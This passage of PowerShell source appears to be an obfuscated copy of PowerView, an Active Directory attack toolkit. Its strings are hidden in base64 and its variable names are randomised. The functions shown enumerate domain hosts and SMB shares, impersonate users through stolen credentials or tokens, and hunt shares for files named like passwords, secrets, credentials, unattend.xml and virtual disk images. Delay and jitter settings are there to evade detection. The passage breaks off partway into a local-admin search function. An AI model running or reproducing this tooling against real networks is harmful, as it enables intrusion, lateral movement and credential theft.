      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) 
{
            ${e4eae45442e047e5aa48d7f04d9dc941} = $ComputerName
     
   }
        else {
            Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABRAHUAZQByAHkAaQ
BuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG
4A')))
            ${e4eae45442e047e5aa48d7f04d9dc941} = Get-
DomainComputer @3cb1483537e3424195869ccaa8e07f42 | Select-Object -
ExpandProperty dnshostname
        }
        Write-Verbose "[Find-
DomainShare] TargetComputers length: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.Length)"
        if 
(${e4eae45442e047e5aa48d7f04d9dc941}.Length -eq 0) {
            
throw $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABOAG8AIABoAG8Acw
B0AHMAIABmAG8AdQBuAGQAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQA=')))
       
 }
        ${d2a8f7b9002b4411b13bcd2f1a3115ec} = {
            Param
($ComputerName, $CheckShareAccess, $TokenHandle)
            if 
($TokenHandle) {
                $Null = Invoke-UserImpersonation -
TokenHandle $TokenHandle -Quiet
            }
            ForEach 
(${40850bc66a0f4e928e6df4b311ffe16b} in $ComputerName) {
             
   ${4efbcb35501b479291674720e11a9ca9} = Test-Connection -Count 1 -
Quiet -ComputerName ${40850bc66a0f4e928e6df4b311ffe16b}
              
  if (${4efbcb35501b479291674720e11a9ca9}) {
                    
${5c9d4c7f72c04ff4aeea77378e3c829e} = Get-NetShare -ComputerName 
${40850bc66a0f4e928e6df4b311ffe16b}
                    ForEach 
(${7f50cc77ecd24a108ede9377d82e51fa} in 
${5c9d4c7f72c04ff4aeea77378e3c829e}) {
                        
${619c43be14474b1289036082e97a9d85} = 
${7f50cc77ecd24a108ede9377d82e51fa}.Name
                        
$Path = '\\'+${40850bc66a0f4e928e6df4b311ffe16b}+'\'+
${619c43be14474b1289036082e97a9d85}
                        if 
((${619c43be14474b1289036082e97a9d85}) -and 
(${619c43be14474b1289036082e97a9d85}.trim() -ne '')) {
               
             if ($CheckShareAccess) {
                                
try {
                                    $Null = 
[IO.Directory]::GetFiles($Path)
                                    
${7f50cc77ecd24a108ede9377d82e51fa}
                                
}
                                catch {
                             
       Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQByAHIAbwByACAAYQBjAGMAZQBzAHMAaQBuAGcAIABzAGgAYQByAGUAIABwAGEAdA
BoACAAJABQAGEAdABoACAAOgAgACQAXwA=')))
                               
 }
                            }
                            else {
    
                            ${7f50cc77ecd24a108ede9377d82e51fa}
      
                      }
                        }
                    
}
                }
            }
            if ($TokenHandle) {
       
         Invoke-RevertToSelf
            }
        }
        
${bfcebd26467f492297f5dcbf75cad4ab} = $Null
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAGwAYQB5AA==')))] -or $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                
${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-UserImpersonation -
Credential $Credential
            }
            else {
                
${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-UserImpersonation -
Credential $Credential -Quiet
            }
        }
    }
    PROCESS 
{
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAGwAYQB5AA==')))] -or $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-
Verbose "[Find-DomainShare] Total number of hosts: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.count)"
            Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABEAGUAbABhAHkAOg
AgACQARABlAGwAYQB5ACwAIABKAGkAdAB0AGUAcgA6ACAAJABKAGkAdAB0AGUAcgA=')
))
            ${7e62acf6abb54c758ee4864a2533a125} = 0
            
${acdea612248b49fc9b8ce2f557f219ab} = New-Object System.Random
       
     ForEach (${40850bc66a0f4e928e6df4b311ffe16b} in 
${e4eae45442e047e5aa48d7f04d9dc941}) {
                
${7e62acf6abb54c758ee4864a2533a125} = 
${7e62acf6abb54c758ee4864a2533a125} + 1
                Start-Sleep 
-Seconds ${acdea612248b49fc9b8ce2f557f219ab}.Next((1-$Jitter)*
$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-
DomainShare] Enumerating server ${40850bc66a0f4e928e6df4b311ffe16b} 
(${7e62acf6abb54c758ee4864a2533a125} of 
$(${e4eae45442e047e5aa48d7f04d9dc941}.count))"
                
Invoke-Command -ScriptBlock ${d2a8f7b9002b4411b13bcd2f1a3115ec} -
ArgumentList ${40850bc66a0f4e928e6df4b311ffe16b}, $CheckShareAccess, 
${bfcebd26467f492297f5dcbf75cad4ab}
            }
        }
        
else {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABVAHMAaQBuAGcAIA
B0AGgAcgBlAGEAZABpAG4AZwAgAHcAaQB0AGgAIAB0AGgAcgBlAGEAZABzADoAIAAkAF
QAaAByAGUAYQBkAHMA')))
            
${d7a06eecc9954e48b3afbf05a1f9fca1} = @{
                
'CheckShareAccess' = $CheckShareAccess
                'TokenHandle' 
= ${bfcebd26467f492297f5dcbf75cad4ab}
            }
            New-
ThreadedFunction -ComputerName ${e4eae45442e047e5aa48d7f04d9dc941} 
-ScriptBlock ${d2a8f7b9002b4411b13bcd2f1a3115ec} -ScriptParameters 
${d7a06eecc9954e48b3afbf05a1f9fca1} -Threads $Threads
        }
    }
  
  END {
        if (${bfcebd26467f492297f5dcbf75cad4ab}) {
            
Invoke-RevertToSelf -TokenHandle 
${bfcebd26467f492297f5dcbf75cad4ab}
        }
    }
}
function Find-
InterestingDomainShareFile {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    
[CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    
Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('DNSHostName')]
        [String[]]
        $ComputerName,
        
[ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
   
     [ValidateNotNullOrEmpty()]
        [String]
        
$ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        
[String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty
()]
        [Alias('OperatingSystem')]
        [String]
        
$ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        
[Alias('ServicePack')]
        [String]
        $ComputerServicePack,
  
      [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        
[String]
        $ComputerSiteName,
        [Parameter
(ParameterSetName = 'FileSpecification')]
        
[ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
    
    [String[]]
        $Include = @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgBwAGEAcwBzAHcAbwByAGQAKgA='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgBzAGUAbgBzAGkAdABpAHYAZQAqAA=='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgBhAGQAbQBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('KgBsAG8AZwBpAG4AKgA='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgBzAGUAYwByAGUAdAAqAA=='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgAuAHYAbQBkAGsA'))), $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgBjAHIAZQBkAGUAbgB0AGkAYQBsACoA'))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgAuAGMAbwBuAGYAaQBnAA==')))),
        [ValidateNotNullOrEmpty()]
   
     [ValidatePattern('\\\\')]
        [Alias('Share')]
        
[String[]]
        $SharePath,
        [String[]]
        
$ExcludedShares = @('C$', $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QQBkAG0AaQBuACQA'))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAGkAbgB0ACQA'))), $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('SQBQAEMAJAA=')))),
        [Parameter
(ParameterSetName = 'FileSpecification')]
        
[ValidateNotNullOrEmpty()]
        [DateTime]
        
$LastAccessTime,
        [Parameter(ParameterSetName = 
'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        
[DateTime]
        $LastWriteTime,
        [Parameter(ParameterSetName 
= 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        
[DateTime]
        $CreationTime,
        [Parameter(ParameterSetName 
= 'OfficeDocs')]
        [Switch]
        $OfficeDocs,
        
[Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        
$FreshEXEs,
        [ValidateNotNullOrEmpty()]
        [Alias
('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        
$Tombstone,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [ValidateRange
(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange
(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        
[ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        
${3cb1483537e3424195869ccaa8e07f42} = @{
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')
))]) { ${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = $OperatingSystem 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = $ServicePack }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) 
{
            ${e4eae45442e047e5aa48d7f04d9dc941} = $ComputerName
     
   }
        else {
            Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaA
BhAHIAZQBGAGkAbABlAF0AIABRAHUAZQByAHkAaQBuAGcAIABjAG8AbQBwAHUAdABlAH
IAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
            
${e4eae45442e047e5aa48d7f04d9dc941} = Get-DomainComputer 
@3cb1483537e3424195869ccaa8e07f42 | Select-Object -ExpandProperty 
dnshostname
        }
        Write-Verbose "[Find-
InterestingDomainShareFile] TargetComputers length: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.Length)"
        if 
(${e4eae45442e047e5aa48d7f04d9dc941}.Length -eq 0) {
            
throw $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaA
BhAHIAZQBGAGkAbABlAF0AIABOAG8AIABoAG8AcwB0AHMAIABmAG8AdQBuAGQAIAB0AG
8AIABlAG4AdQBtAGUAcgBhAHQAZQA=')))
        }
        
${d2a8f7b9002b4411b13bcd2f1a3115ec} = {
            Param
($ComputerName, $Include, $ExcludedShares, $OfficeDocs, 
$ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)
         
   if ($TokenHandle) {
                $Null = Invoke-
UserImpersonation -TokenHandle $TokenHandle -Quiet
            }
      
      ForEach (${40850bc66a0f4e928e6df4b311ffe16b} in $ComputerName) 
{
                ${39deacfb775c4e8da789ab446cc433db} = @()
           
     if (${40850bc66a0f4e928e6df4b311ffe16b}.StartsWith('\\')) {
     
               ${39deacfb775c4e8da789ab446cc433db} += 
${40850bc66a0f4e928e6df4b311ffe16b}
                }
                
else {
                    ${4efbcb35501b479291674720e11a9ca9} = 
Test-Connection -Count 1 -Quiet -ComputerName 
${40850bc66a0f4e928e6df4b311ffe16b}
                    if 
(${4efbcb35501b479291674720e11a9ca9}) {
                        
${5c9d4c7f72c04ff4aeea77378e3c829e} = Get-NetShare -ComputerName 
${40850bc66a0f4e928e6df4b311ffe16b}
                        ForEach 
(${7f50cc77ecd24a108ede9377d82e51fa} in 
${5c9d4c7f72c04ff4aeea77378e3c829e}) {
                            
${619c43be14474b1289036082e97a9d85} = 
${7f50cc77ecd24a108ede9377d82e51fa}.Name
                            
$Path = '\\'+${40850bc66a0f4e928e6df4b311ffe16b}+'\'+
${619c43be14474b1289036082e97a9d85}
                            if 
((${619c43be14474b1289036082e97a9d85}) -and 
(${619c43be14474b1289036082e97a9d85}.Trim() -ne '')) {
               
                 if ($ExcludedShares -NotContains 
${619c43be14474b1289036082e97a9d85}) {
                               
     try {
                                        $Null = 
[IO.Directory]::GetFiles($Path)
                                      
  ${39deacfb775c4e8da789ab446cc433db} += $Path
                       
             }
                                    catch {
            
                            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwAhAF0AIABOAG8AIABhAGMAYwBlAHMAcwAgAHQAbwAgACQAUABhAHQAaAA=')))
   
                                 }
                                }
  
                          }
                        }
                 
   }
                }
                ForEach 
(${7f50cc77ecd24a108ede9377d82e51fa} in 
${39deacfb775c4e8da789ab446cc433db}) {
                    Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAaQBuAGcAIABzAGgAYQByAGUAOgAgACQAewA3AGYANQAwAGMAYw
A3ADcAZQBjAGQAMgA0AGEAMQAwADgAZQBkAGUAOQAzADcANwBkADgAMgBlADUAMQBmAG
EAfQA=')))
                    ${75d59ae7e2be4a418164c96891c0e082} = 
@{
                        'Path' = 
${7f50cc77ecd24a108ede9377d82e51fa}
                        'Include' 
= $Include
                    }
                    if ($OfficeDocs) 
{
                        ${75d59ae7e2be4a418164c96891c0e082}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBmAGYAaQBjAGUARABvAGMAcwA=')))] = $OfficeDocs
                    
}
                    if ($FreshEXEs) {
                        
${75d59ae7e2be4a418164c96891c0e082}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgByAGUAcwBoAEUAWABFAHMA')))] = $FreshEXEs
                    }
    
                if ($LastAccessTime) {
                        
${75d59ae7e2be4a418164c96891c0e082}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABhAHMAdABBAGMAYwBlAHMAcwBUAGkAbQBlAA==')))] = $LastAccessTime
    
                }
                    if ($LastWriteTime) {
           
             ${75d59ae7e2be4a418164c96891c0e082}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA=')))] = $LastWriteTime
         
           }
                    if ($CreationTime) {
                 
       ${75d59ae7e2be4a418164c96891c0e082}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAYQB0AGkAbwBuAFQAaQBtAGUA')))] = $CreationTime
              
      }
                    if ($CheckWriteAccess) {
                  
      ${75d59ae7e2be4a418164c96891c0e082}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBoAGUAYwBrAFcAcgBpAHQAZQBBAGMAYwBlAHMAcwA=')))] = 
$CheckWriteAccess
                    }
                    Find-
InterestingFile @75d59ae7e2be4a418164c96891c0e082
                }
   
         }
            if ($TokenHandle) {
                Invoke-
RevertToSelf
            }
        }
        
${bfcebd26467f492297f5dcbf75cad4ab} = $Null
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAGwAYQB5AA==')))] -or $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                
${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-UserImpersonation -
Credential $Credential
            }
            else {
                
${bfcebd26467f492297f5dcbf75cad4ab} = Invoke-UserImpersonation -
Credential $Credential -Quiet
            }
        }
    }
    PROCESS 
{
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAGwAYQB5AA==')))] -or $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-
Verbose "[Find-InterestingDomainShareFile] Total number of hosts: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.count)"
            Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaA
BhAHIAZQBGAGkAbABlAF0AIABEAGUAbABhAHkAOgAgACQARABlAGwAYQB5ACwAIABKAG
kAdAB0AGUAcgA6ACAAJABKAGkAdAB0AGUAcgA=')))
            
${7e62acf6abb54c758ee4864a2533a125} = 0
            
${acdea612248b49fc9b8ce2f557f219ab} = New-Object System.Random
       
     ForEach (${40850bc66a0f4e928e6df4b311ffe16b} in 
${e4eae45442e047e5aa48d7f04d9dc941}) {
                
${7e62acf6abb54c758ee4864a2533a125} = 
${7e62acf6abb54c758ee4864a2533a125} + 1
                Start-Sleep 
-Seconds ${acdea612248b49fc9b8ce2f557f219ab}.Next((1-$Jitter)*
$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-
InterestingDomainShareFile] Enumerating server 
${40850bc66a0f4e928e6df4b311ffe16b} 
(${7e62acf6abb54c758ee4864a2533a125} of 
$(${e4eae45442e047e5aa48d7f04d9dc941}.count))"
                
Invoke-Command -ScriptBlock ${d2a8f7b9002b4411b13bcd2f1a3115ec} -
ArgumentList ${40850bc66a0f4e928e6df4b311ffe16b}, $Include, 
$ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, 
$CheckWriteAccess, ${bfcebd26467f492297f5dcbf75cad4ab}
            }
  
      }
        else {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaA
BhAHIAZQBGAGkAbABlAF0AIABVAHMAaQBuAGcAIAB0AGgAcgBlAGEAZABpAG4AZwAgAH
cAaQB0AGgAIAB0AGgAcgBlAGEAZABzADoAIAAkAFQAaAByAGUAYQBkAHMA')))
       
     ${d7a06eecc9954e48b3afbf05a1f9fca1} = @{
                
'Include' = $Include
                'ExcludedShares' = 
$ExcludedShares
                'OfficeDocs' = $OfficeDocs
            
    'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = 
$FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
     
           'TokenHandle' = ${bfcebd26467f492297f5dcbf75cad4ab}
       
     }
            New-ThreadedFunction -ComputerName 
${e4eae45442e047e5aa48d7f04d9dc941} -ScriptBlock 
${d2a8f7b9002b4411b13bcd2f1a3115ec} -ScriptParameters 
${d7a06eecc9954e48b3afbf05a1f9fca1} -Threads $Threads
        }
    }
  
  END {
        if (${bfcebd26467f492297f5dcbf75cad4ab}) {
            
Invoke-RevertToSelf -TokenHandle 
${bfcebd26467f492297f5dcbf75cad4ab}
        }
    }
}
function Find-
LocalAdminAccess {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        
[Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('DNSHostName')]
        [String[]]
        $ComputerName,
        
[ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
   
     [ValidateNotNullOrEmpty()]
        [String]
        
$ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        
[String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty
()]
        [Alias('OperatingSystem')]
        [String]
        
$ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        
[Alias('ServicePack')]
        [String]
        $ComputerServicePack,
  
      [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        
[String]
        $ComputerSiteName,
        [Switch]
        
$CheckShareAccess,
        [ValidateNotNullOrEmpty()]
        [Alias
('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        
$Tombstone,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [ValidateRange
(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange
(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        
[ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        
${3cb1483537e3424195869ccaa8e07f42} = @{
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
